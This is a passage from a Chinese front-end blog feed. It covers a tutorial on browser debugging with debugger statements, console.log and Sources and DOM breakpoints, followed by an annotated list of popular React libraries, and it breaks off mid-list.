c + d ;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">showNewName</span>(<span class="params"></span>)&#123;</span><br><span class="line"> <span class="keyword">var</span> a = <span class="string">&#x27;FreeStyle&#x27;</span>,</span><br><span class="line">  b = <span class="string">&#x27;CuteFaller&#x27;</span>;</span><br><span class="line"> <span class="keyword">var</span> newName = <span class="title function_">getNewName</span>(a,b);</span><br><span class="line"> <span class="keyword">var</span> word = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;word&#x27;</span>);</span><br><span class="line"> <span class="built_in">setTimeout</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">  <span class="keyword">var</span> newWord = <span class="string">&#x27;新文字：&#x27;</span> + newName ;</span><br><span class="line">  word.<span class="property">innerText</span> = newWord ;</span><br><span class="line">  word.<span class="title function_">setAttribute</span>(<span class="string">&#x27;isNewName&#x27;</span>,<span class="literal">true</span>)</span><br><span class="line"> &#125;,<span class="number">1000</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">showNewName</span>();</span><br></pre></td></tr></table></figure><p>保存后在浏览器中打开 HTML 文件，我们会发现浏览器中“这是一段文字”在一秒钟之后变成了另一行文字。为什么会有这样的变化呢？我们在程序中设置一个断点来调试看看。在 getNewName 方法中写下一行 debugger;</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">getNewName</span>(<span class="params">name1,name2</span>)&#123;</span><br><span class="line">  <span class="keyword">debugger</span>;</span><br><span class="line">  <span class="keyword">var</span> c = name1.<span class="title function_">slice</span>(<span class="number">0</span>,<span class="number">4</span>),</span><br><span class="line">      d = name2.<span class="title function_">slice</span>(<span class="number">4</span>);</span><br><span class="line">  <span class="keyword">return</span> c + d ;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>保存文件并刷新浏览器，我们发现页面进入了断点位置</p><p>进入断点</p><p>打开控制台，此时我们停留在 Sources 一栏，还记得上一章介绍的内容吗？ Sources 展示着当前页面的资源，因此我们所写的 JS 代码自然也是可以在这里找到的。</p><p>仔细观察断点处，我们看到给 getNewName 方法传递的两个参数都有了值，控制台在代码边上备注了 “name1 &#x3D; “FreeStyle” , name2 &#x3D; “CuteFaller””这是当前函数执行时的变量值。</p><p>当我们用鼠标选中 name1.slice(0,4) 这一行，我们可以看到鼠标上方出现了一个显示 “Free”的气泡，这是浏览器执行这一句指令返回的结果。</p><p>查看运行情况</p><p>断点状态下按 F8 可以跳过当前断点继续执行，直到程序结束或是进入到下一个断点。按 F10 可以进行单步调试，即一行一行得执行代码，每一行的细节都可以进行查看。</p><p>除了可以在代码中写 debugger; 我们还可以通过 console.log(); 方法打印我们想要的信息。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">getNewName</span>(<span class="params">name1,name2</span>)&#123;</span><br><span class="line">  <span class="keyword">var</span> c = name1.<span class="title function_">slice</span>(<span class="number">0</span>,<span class="number">4</span>),</span><br><span class="line">      d = name2.<span class="title function_">slice</span>(<span class="number">4</span>);</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(c);</span><br><span class="line">  <span class="keyword">return</span> c + d ;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在代码中加上一行打印，刷新页面发现没有进入断点。打开控制台，我们在 Console 中看到一行打印信息 “Free” 这就是我们打印的变量 c 的值。程序在执行到打印 c 的时候会将 c 当时的值打印到控制台，这样我们不需要进入断点也能够查看自己想知道的变量在运行阶段的值。</p><p>当然，我们还可以将两者并存，当程序进入到断点的时候，我们能通过 Console 控制台查看变量的值。断点状态下， Console 控制台会保留运行时的值和状态，我们可以在控制台直接访问当前执行函数内的变量。此外，当程序报错时，我们会第一时间在 Console 中看到，点击 Console 中的错误详情，就会跳转到 Sources 中的报错文件里，因此某种程度上，在调试过程中两者有着非常密切的联系。</p><p>最后要着重提醒的一点是，由于 debugger 和 console 这两种方式都是在源代码上添加的调试指令，所以当我们完成调试以后，<strong>一定要将它们删除</strong>，否则代码上线后他人也会进入到断点中，无法流畅得使用网页。</p><p><a name="if4mge"></a></p><h3 id="2-浏览器-Sources-中手动打断点"><a href="#2-浏览器-Sources-中手动打断点" class="headerlink" title="2. 浏览器 Sources 中手动打断点"></a>2. 浏览器 Sources 中手动打断点</h3><p>上一节内容我们介绍了如何进行 debug 调试，大家可能会觉得这样调试有些繁琐，要去源码中加调试代码，调完还得记得删除掉。那么我们在这一章，给大家提供一个简单明了的办法 —— 直接在 Sources中调试。</p><p>大家可以回顾一下上一章中我们对 JS 的调试，在 Sources 中通过 ctrl + P 找到我们希望调试的代码文件，ctrl + F 定位到我们想要调试的行。接下来，我们可以在文件的侧边栏上设置断点，设置方法就是在行数上单击。单击后行数上出现一个蓝色的便签，就表示已经在这一行上设置了断点，接下来刷新页面就可以进入到断点中查看了。</p><p>进入断点之后我们其实可以在浏览器的文件上进行编辑，不用进入源文件修改代码，就能够进行代码尝试。<br />编写临时代码</p><p>比如我们先进入到函数 getNewName 的断点中，再将代码 d &#x3D; name2.slice(4); 改写为 d &#x3D; name2.slice(4,6); 按 ctrl + S 保存。接下来按 F10 单步执行，当执行到这一句时，我们发现浏览器已经按照我们改写的代码执行了 d &#x3D; “Fa”，说明我们的临时代码生效了。</p><p>临时代码生效</p><p>跳过断点，页面上显示出 “新文字：FreeFa”，说明我们的改动并不影响后续逻辑的继续执行。但是数据已经按我们期望的临时改动展现了出来。</p><p>继续执行</p><p>这样进行代码调试我们不需要改变源代码即可对问题进行排查，非常灵活和快捷。想在什么地方设置断点只需要在 Sources 中找到对应的文件，点击一下想设置断点的那一行即可，无需改动源码，效率大大提升。调试结束后再次点击这些断点即可解除断点，对他人的网页不会造成任何影响。</p><p><a name="xy16us"></a></p><h3 id="3-浏览器-DOM-节点设置断点"><a href="#3-浏览器-DOM-节点设置断点" class="headerlink" title="3. 浏览器 DOM 节点设置断点"></a>3. 浏览器 DOM 节点设置断点</h3><p>最后我们再来看看 DOM 节点上设置断点的方法。我们在开发页面的时候，往往会对 DOM 节点做变更处理，假设业务场景比较复杂，你并不能确定某一个 DOM 的变化是由哪一个文件执行导致的。这时我们可以换一个角度，从 DOM 出发，监听 DOM 变化，再反过来追查引发其变化的代码。</p><p>浏览器提供了这样的操作，我们先在 Elements 模块中找到我们需要监听的 DOM 节点（这里我们以 p 节点为例），找到以后点击右键，选择 Break On 。里面可以监听三种变化类型：subtree modifications、attribute modifications和node removal。分别是对应子节点树更新、修改节点属性和移除节点。</p><p>监听节点操作</p><p>这里我们选择 attribute modifications 。接下来我们刷新页面，一秒钟之后进入断点。查看断点的位置，这里的代码是</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">word.<span class="title function_">setAttribute</span>(<span class="string">&#x27;isNewName&#x27;</span>,<span class="literal">true</span>)</span><br></pre></td></tr></table></figure><p>正是这行代码在给 p 标签添加了名为 isNewName 的属性。</p><p>DOM 变化进入断点</p><p>这样我们就定位了引起 p 节点属性变化的 JS 代码，是不是很方便？对于不符合预期的节点变换，也可以通过这样的方式去追踪，真相很快就能浮出水面啦。</p><p><a name="x5emql"></a></p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>以上，是我们常用的几种 debug 调试方法。开发过程中妥善利用它，对我们的开发效率和排查问题的能力都有很大的帮助。当然，想学会调试最重要的还是要多尝试，熟能生巧。利器已在眼前，还请亲手体验。</p>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> 浏览器 </category>
          
          <category> 调试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 浏览器 </tag>
            
            <tag> 调试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>React 库</title>
      <link href="/2021/06/22/frontend/collection/wheel/react-ku/"/>
      <url>/2021/06/22/frontend/collection/wheel/react-ku/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><p><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1659661028895-0903535d-f3f2-4f99-8c0f-69bdfefb5694.png?x-oss-process=image/resize,w_750,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1659661028895-0903535d-f3f2-4f99-8c0f-69bdfefb5694.png?x-oss-process=image/resize,w_750,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><strong>1、状态管理</strong><br /><strong>（1）React Redux</strong><br />Redux 是 JavaScript 应用程序的状态容器，提供可预测的状态管理。React Redux 是 Redux 官方实现的 React 绑定。可以让你构建一致化的应用，运行于不同的环境（客户端、服务器、原生应用），并且易于测试。不仅于此，它还提供超爽的开发体验。<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1659623141620-84e290b8-c9ba-4a4e-8e65-295891ad4860.png" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1659623141620-84e290b8-c9ba-4a4e-8e65-295891ad4860.png" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><strong>（2）Mobx</strong><br />MobX 是一个身经百战的库，它通过运用透明的函数式响应编程使状态管理变得简单和可扩展。<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1659623224139-396bcd40-f8ae-4ec4-b05f-1b4d5da9a487.png" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1659623224139-396bcd40-f8ae-4ec4-b05f-1b4d5da9a487.png" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><strong>（4）Redux-Saga</strong><br />redux-saga 是一个旨在使应用程序的副作用（即，数据获取等异步操作和访问浏览器缓存等不纯操作）更易于管理、执行更高效、易于测试以及更好地处理故障的库。<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1659621552419-2bcd4f4f-b8b1-4824-a2b6-b91492889f19.png" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1659621552419-2bcd4f4f-b8b1-4824-a2b6-b91492889f19.png" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><strong>2、文档网站</strong><br /><strong>（1）Docusaurus</strong><br />Docusaurus 是由 facebook 开源的一个用于轻松构建、部署和维护开源项目网站的项目。使用 Docusaurus 可以让你<strong>专注于内容</strong>，并只需编写 Markdown 文件即可。<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1659625158061-6984b773-f55d-430a-8ace-49e7cdfcf1ba.png" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1659625158061-6984b773-f55d-430a-8ace-49e7cdfcf1ba.png" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><strong>（2）Storybook</strong><br />Storybook 是 UI 组件的开发环境，它允许开发者浏览组件库，查看每个组件的不同状态，以及交互地开发和测试组件。<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1659625242414-a9892d68-35a5-4486-9ba4-a738d3cad1d1.png" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1659625242414-a9892d68-35a5-4486-9ba4-a738d3cad1d1.png" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><strong>（3）React Styleguidist</strong><br />React Styleguidist是一个React设计规范生成器，一个本地组件开发环境，支持热重载，共享的设计规范。它会列出了组件propTypes，并基于Markdown文件显示可编辑的实时使用示例。<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1659625388407-8ba2a64c-0bfd-4d0d-a371-84c79b999539.png?x-oss-process=image/resize,w_750,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1659625388407-8ba2a64c-0bfd-4d0d-a371-84c79b999539.png?x-oss-process=image/resize,w_750,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><strong>3、路由</strong><br /><strong>（1）React Router</strong><br />React Router 是完整的 React 路由解决方案。React Router 保持 UI 与 URL 同步。它拥有简单的 API 与强大的功能例如代码缓冲加载、动态路由匹配、以及建立正确的位置过渡处理。<br /><img src="https://cdn.nlark.com/yuque/0/2022/webp/1500604/1659623826534-3239472c-5e96-4fed-869e-40ab485ee5b1.webp" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/webp/1500604/1659623826534-3239472c-5e96-4fed-869e-40ab485ee5b1.webp" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><strong>（2）React Location</strong><br />React Location 是客户端 React 应用程序的路由器。它支持异步路由、深度集成的搜索参数 API、可选的 JSX 路由定义、用于路由加载器缓存的预打包简单缓存实现、带有外部缓存和存储的轻松集成等。<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1659623883093-6eaf5b0d-5612-438b-8987-00747ba39657.png?x-oss-process=image/resize,w_958,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1659623883093-6eaf5b0d-5612-438b-8987-00747ba39657.png?x-oss-process=image/resize,w_958,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><strong>4、脚手架</strong><br /><strong>（1）Create React App</strong><br />Create React App 是一种官方支持的创建单页 React 应用程序的方式。它提供了一个没有配置的现代构建设置。<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1659624007783-5b261991-b61e-43ab-bcea-8940b75ba621.png" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1659624007783-5b261991-b61e-43ab-bcea-8940b75ba621.png" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><strong>（2）Rekit</strong><br />Rekit是开源的一个脚手架，用于使用 React、Redux 和 React-router 构建可扩展的 Web 应用程序。它可以帮助开发人员专注于业务逻辑，而不是处理大量的库、模式、配置等。<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1659624254667-e2b02254-dd61-47ae-a5bb-7d3744df5bdb.png" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1659624254667-e2b02254-dd61-47ae-a5bb-7d3744df5bdb.png" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><strong>5、应用调试</strong><br /><strong>（1）React Developer Tools</strong><br />React Devtools 可以在 Chrome 和 Firefox 开发者工具审查 React 组件的浏览器扩展。可以用于检查React组件层次结构，在页面上显示React组件。<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1659624362010-fbc8f4c1-2cfd-4e15-870d-0a919077f73b.png" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1659624362010-fbc8f4c1-2cfd-4e15-870d-0a919077f73b.png" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><strong>（2）Why Did You Render</strong><br />Why Did You Render 是由 Welldone Software 开发的，可以在开发的时候就检测到一些不必要的渲染问题，告诉我们当前渲染是什么原因导致的。<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1659622826859-f22252b9-f21a-4987-8f2a-7334581d93a3.png?x-oss-process=image/resize,w_750,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1659622826859-f22252b9-f21a-4987-8f2a-7334581d93a3.png?x-oss-process=image/resize,w_750,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><strong>6、动画</strong><br /><strong>（1）Animate.css</strong><br />animate.css 是一个使用CSS3的animation制作的动画效果的CSS集合，里面预设了很多种常用的动画，且使用非常简单。<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1659627823935-e9f09cff-8b4d-4fed-aad8-018aa93d4d9b.png?x-oss-process=image/resize,w_750,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1659627823935-e9f09cff-8b4d-4fed-aad8-018aa93d4d9b.png?x-oss-process=image/resize,w_750,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><strong>（2）React Spring</strong><br />react-spring 是一个基于弹簧物理学的动画库，满足大多数与UI相关的动画需求，提供了足够灵活的工具，可以自信地将想法投射到不断变化的界面中。该库代表了一种现代动画方法。它继承了 animated 强大的插值和性能，以及 react-motion 的易用性。<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1659627719149-06917885-e966-401f-b69b-8d01bb19f3ed.png?x-oss-process=image/resize,w_750,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1659627719149-06917885-e966-401f-b69b-8d01bb19f3ed.png?x-oss-process=image/resize,w_750,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><strong>（3）React Reveal</strong><br />React Reveal 是一个用于 React 的高性能动画库。它占用空间小，专门为 ES6 中的 React 编写。可用于创建各种炫酷的滚动效果显<img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1659627757718-0ad92ecf-0bdb-4d10-8c45-7b683f357b87.png?x-oss-process=image/resize,w_750,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1659627757718-0ad92ecf-0bdb-4d10-8c45-7b683f357b87.png?x-oss-process=image/resize,w_750,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif">示。</p><p><strong>GitHub：</strong><a href="https://github.com/rnosov/react-reveal">https://github.com/rnosov/react-reveal</a></p><p><strong>（4）React-Motion</strong><br />React-Motion 是一个动画库，拥有一种更轻松的方法来创建和实现逼真的动画。它利用物理学来为 React 元素创建几乎自然的动画。<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1659629685780-7bec1943-43a3-4654-a095-741763db9004.png?x-oss-process=image/resize,w_750,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1659629685780-7bec1943-43a3-4654-a095-741763db9004.png?x-oss-process=image/resize,w_750,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><strong>7、可视化</strong><br /><strong>（1）Apache ECharts</strong><br />Apache ECharts 是一款基于Javascript的数据可视化图表库，提供直观，生动，可交互，可个性化定制的数据可视化图表。它是用纯 JavaScript 编写的，基于zrender，是一个全新的轻量级画布库。<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1659626661082-2ae6dc8a-d0a4-447c-a3ec-41f33305f057.png?x-oss-process=image/resize,w_750,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1659626661082-2ae6dc8a-d0a4-447c-a3ec-41f33305f057.png?x-oss-process=image/resize,w_750,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><strong>（2）Recharts</strong><br />Recharts 是一个用React和D3构建的、重新定义的图表库。该库的主要目的是在 React 应用程序中轻松编写图表。<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1659626691898-90432456-3263-4cfe-9d6c-5beda120e6e7.png?x-oss-process=image/resize,w_750,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1659626691898-90432456-3263-4cfe-9d6c-5beda120e6e7.png?x-oss-process=image/resize,w_750,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><strong>（3）react-vis</strong><br />react-vis 是一组用于呈现常见数据可视化图表的 react 组件，例如折线图&#x2F;面积图&#x2F;条形图、热图、散点图、等高线图、六边形热图、饼图和圆环图、旭日形图、雷达图、平行坐标和树形图。<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1659626765054-8ab6e054-e28f-49a0-b7f6-daac1d1f2814.png?x-oss-process=image/resize,w_750,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1659626765054-8ab6e054-e28f-49a0-b7f6-daac1d1f2814.png?x-oss-process=image/resize,w_750,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><strong>8、UI组件</strong><br /><strong>（1）Ant Design</strong><br />GitHub 上超过 269 k 个项目使用了 Ant Design 组件库，Ant Design of React 是一个基于 Ant Design 设计体系的 React UI 组件库，主要用于研发企业级中后台产品。Ant Design 提供了大量高质量的组件，非常适合快速构建整个 UI 框架，也可以只使用单个组件。<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1659627209475-2aa8d171-5188-4475-95ec-7c82f22dcae6.png?x-oss-process=image/resize,w_750,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1659627209475-2aa8d171-5188-4475-95ec-7c82f22dcae6.png?x-oss-process=image/resize,w_750,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><strong>（2）MUI</strong><br />MUI 是一个基于 Google 的 Material Design 的简单且可定制的 React 组件库。MUI 不仅是一个组件库，而是一个完整的设计系统。它具有一套完整的指南、设计原则和 UI 设计最佳实践系统。<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1659627326985-59e81a3b-948e-4373-b402-1a9c206e5cb9.png?x-oss-process=image/resize,w_750,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1659627326985-59e81a3b-948e-4373-b402-1a9c206e5cb9.png?x-oss-process=image/resize,w_750,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><strong>（3）React Bootstrap</strong><br />React-Bootstrap，是比较古老的 React UI 组件库之一。它是使用 React 来重新构建了前端框架 Bootstrap。该库由完全响应并且可访问的现成的组件组成。所有设计元素都是高度可定制的。<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1659627626082-3d969ead-b715-4c8b-a518-d4b6a9a2de21.png?x-oss-process=image/resize,w_750,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1659627626082-3d969ead-b715-4c8b-a518-d4b6a9a2de21.png?x-oss-process=image/resize,w_750,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><strong>9、性能优化</strong><br /><strong>（1）React Virtualized</strong><br />React Virtualized 是一个以高效渲染大型列表和表格数据的响应式组件，可以用来解决长列表渲染问题。<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1659628708101-b50b95ef-9cd1-4c52-b239-48363c1b3236.png" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1659628708101-b50b95ef-9cd1-4c52-b239-48363c1b3236.png" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><strong>（2）React Window</strong><br />React Window 是用于高效渲染大型列表和表格数据的 React 组件。通过仅渲染大型数据集的一部分（刚好足以填充满视口）来工作。<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1659629884077-ce9fcfeb-1e7b-47ae-9c6c-cb1eac6d34ad.png?x-oss-process=image/resize,w_750,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1659629884077-ce9fcfeb-1e7b-47ae-9c6c-cb1eac6d34ad.png?x-oss-process=image/resize,w_750,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><strong>10、表单</strong><br /><strong>（1）React Hook Form</strong><br />React Hook Form 是一个高性能、灵活、易拓展、易于使用的表单校验库，用于 React Web 和 React Native 的表单验证。<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1659628331580-040f8010-42ac-4382-b772-b2f37f9d71eb.png?x-oss-process=image/resize,w_957,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1659628331580-040f8010-42ac-4382-b772-b2f37f9d71eb.png?x-oss-process=image/resize,w_957,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><strong>（2）Formik</strong><br />Formik是一个可以在React中构建表单的组件。它旨在轻松管理具有复杂验证的表单，支持同步和异步表单级和字段级验证。<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1659628491386-babf6236-717c-4b5d-ac8f-85f727dbe68a.png?x-oss-process=image/resize,w_958,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1659628491386-babf6236-717c-4b5d-ac8f-85f727dbe68a.png?x-oss-process=image/resize,w_958,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><strong>（3）React Final Form</strong><br />React Final Form 是Final Form 的一个精简 React 包装器，它是一个基于订阅的表单状态管理库，使用观察者模式，因此只有需要更新的组件会随着表单状态的变化而重新渲染。<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1659628589263-8999e454-3825-44d8-824f-72e4c6f85098.png" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1659628589263-8999e454-3825-44d8-824f-72e4c6f85098.png" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><strong>11、富文本编辑器</strong><br /><strong>（1）Draft.js</strong><br />Draft.js 是 Facebook 的一个开源项目，是 React 项目首选的富文本编辑器框架。这是一个健壮、可扩展和可定制的框架。Draft.js 遵循与 React 中的受控组件相同的范例，并提供了一个 Editor 呈现富文本输入的组件。它还公开了一个EditorStateAPI 来处理&#x2F;存储Editor组件中的状态更新。<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1659626895080-58dd4d74-8fd8-45f8-a404-7db48cd155c7.png?x-oss-process=image/resize,w_750,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1659626895080-58dd4d74-8fd8-45f8-a404-7db48cd155c7.png?x-oss-process=image/resize,w_750,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><strong>（2）Slate.js</strong><br />Slate.js 是受 Draft.js 启发的富文本编辑器。它是一个可深度定制的富编辑器框架，专用于 React。与 Draft.js 类似，它具有良好的 API、强大的插件基础设施以及与 React 的深度连接。此外，插件生态系统比 Draft.js 小一些，但它的插件质量会更好。<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1659626957073-9ac22d04-0bf8-441d-95d5-4ff9d5616ad6.png?x-oss-process=image/resize,w_750,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1659626957073-9ac22d04-0bf8-441d-95d5-4ff9d5616ad6.png?x-oss-process=image/resize,w_750,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><strong>（3）TinyMCE</strong><br />TinyMCE 是一个热门的富文本编辑器。它的目标是帮助其他开发人员构建精美的 Web 内容解决方案。它易于集成，可以部署在基于云的、自托管或混合环境中。该设置使得合并诸如 Angular、React 和 Vue 等框架成为可能。它还可以使用 50 多个插件进行扩展，每个插件都有 100 多个自定义选项。<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1659627018874-2538f8e0-4d93-4442-bc43-204c02bbeacf.png?x-oss-process=image/resize,w_750,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1659627018874-2538f8e0-4d93-4442-bc43-204c02bbeacf.png?x-oss-process=image/resize,w_750,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><strong>（4）wangEditor</strong><br />wangEditor 是一个使用Typescript 开发的 Web 富文本编辑器， 轻量、简洁、易用、开源免费。它兼容常见的 PC 浏览器：Chrome，Firefox，Safar，Edge，QQ 浏览器，IE11。<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1659627128764-7e4d9fef-8c21-4ecb-a60a-1178e9e7eb90.png?x-oss-process=image/resize,w_750,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1659627128764-7e4d9fef-8c21-4ecb-a60a-1178e9e7eb90.png?x-oss-process=image/resize,w_750,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><strong>12、CSS in JS</strong><br 